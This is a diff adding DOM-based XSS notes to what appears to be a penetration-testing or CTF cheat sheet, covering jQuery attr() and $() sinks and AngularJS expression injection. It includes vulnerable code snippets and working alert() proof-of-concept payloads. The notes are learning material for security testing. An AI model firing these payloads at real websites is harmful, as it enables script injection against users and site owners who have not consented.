@@ -435,6 +435,24 @@ Hacker                                                             website.thm  
     * [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)
     * Look for sinks such as `document.write` and `innerHTML`.
       * `innerHTML` doesn't allow `<script>` or `<svg onload>`, use `<img ...>` and `<iframe>` instead.
+    * jQuery sinks:
+      * `attr()` function can change the attributes of DOM elements, for example, use the payload `?returnUrl=javascript:alert(document.domain)`
+        ```javascript
+        $(function() {
+	           $('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
+        });
+        ```
+      * `$()` can be used to inject malicious objects into the DOM
+        * jQuery have patched this particular vulnerability by preventing you from injecting HTML into a selector when the input begins with a hash character (#)
+        * `<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">`
+        ```javascript
+        $(window).on('hashchange', function() {
+	           var element = $(location.hash);
+	           element[0].scrollIntoView();
+        });
+        ```
+    * AngularJS: It scans the contents of HTML nodes containing the `ng-app` attribute. When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces.
+      * `{{constructor.constructor('alert(1)')()}}`
   * Blind XSS: Similar to a stored XSS but you can't see the payload working or be able to test against yourself first.
     * [xsshunter](https://xsshunter.com/)
 * Payloads
